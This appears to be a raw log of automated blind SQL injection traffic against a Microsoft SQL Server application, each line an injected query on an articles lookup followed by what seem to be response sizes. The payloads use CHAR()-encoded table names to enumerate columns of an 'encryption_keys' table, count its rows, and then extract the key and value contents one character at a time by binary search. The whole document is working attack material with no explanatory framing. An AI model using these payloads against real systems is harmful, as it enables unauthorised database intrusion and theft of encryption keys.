+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>117	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>96	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>112	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>104	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>100	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>102	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),5,1))>101	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),6,1))>96	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),6,1))>48	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),6,1))>1	915
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),1,1))>51	234
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),1,1))>48	234
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),1,1))>49	234
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),1,1))>50	234
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),2,1))>51	234
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),2,1))>48	234
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT([key]) AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys),2,1))>9	233
+	138
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>64	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>104	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>108	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>110	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>109	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>104	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>108	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>110	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>111	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>112	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>120	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>116	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>114	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),3,1))>115	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>96	406
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>112	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>104	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>100	407
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>102	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),4,1))>101	407
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>96	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>48	406
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>1	405
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>96	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>80	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>72	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>68	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>66	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),1,1))>67	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>64	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),2,1))>112	409
+	138
+use [master]	86
+	165
